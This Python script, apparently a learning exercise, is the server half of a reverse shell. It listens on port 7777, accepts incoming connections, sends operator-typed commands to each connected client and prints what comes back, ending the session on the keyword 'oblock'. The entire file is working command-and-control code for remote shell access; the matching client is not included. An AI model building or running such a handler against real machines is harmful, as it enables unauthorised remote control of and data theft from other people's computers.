#lets make the server for a revershell
#what is meant by server for this implementation?
#the client will connect and "present" an interpreter for shell-like commands
#the server needs to listen for this connection and be able to send shell-like commands

import socket
import subprocess
import threading

def main():
    #create socket object 1 for ip check
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    #get internet-facing interface ip address
    sock.connect(("8.8.8.8", 80))
    host_ip = sock.getsockname()[0]
    sock.close()
    del(sock)

    #bind
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host_ip,7777))
    sock.listen()
    print("Binded. Listening.")
    while True:
        socket2, addr = sock.accept()
        print(f"Got connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(socket2,))
        client_handler.start()


def handle_client(socketarg):
    with socketarg as socket2: 
        #acker
        acker=socket2.recv(4096)
        print(acker.decode())
            #time for interpreter
        command=''
        while (command.encode() != b'oblock'):
            command = input("> ")
            socket2.send(command.encode())
            reply = socket2.recv(4096)
            print(reply.decode())
        socket2.send(b'Pulling out due to oblock protocol.')
        bye=socket2.recv(4096)
        print(bye.decode())
        print("Closing...")
        socket2.close()

if __name__=="__main__":
    main()